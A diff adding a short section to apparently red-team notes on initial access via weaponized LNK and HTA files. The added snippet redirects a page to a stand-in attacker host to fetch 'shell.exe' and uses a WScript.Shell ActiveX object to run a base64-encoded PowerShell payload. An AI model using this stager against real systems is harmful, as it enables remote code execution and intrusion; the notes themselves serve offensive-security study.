@@ -65,6 +65,14 @@ $Shortcut.IconLocation = $Icon
 $Shortcut.Save()
 ```
 
+HTA allows us to execute VBScripts and JScripts, so we can do something like this:
+```html
+// payload.html
+<script>
+window.location = "http://attacker.com/shell.exe";
+new ActiveXObject('WScript.Shell').Run("powershell -e <base64_payload>");
+</script>
+```
 
 # WikiLinks
 - https://docs.redteamleaders.com/offensive-security/initial-access/weaponized-lnk-files-for-initial-access-and-delivery
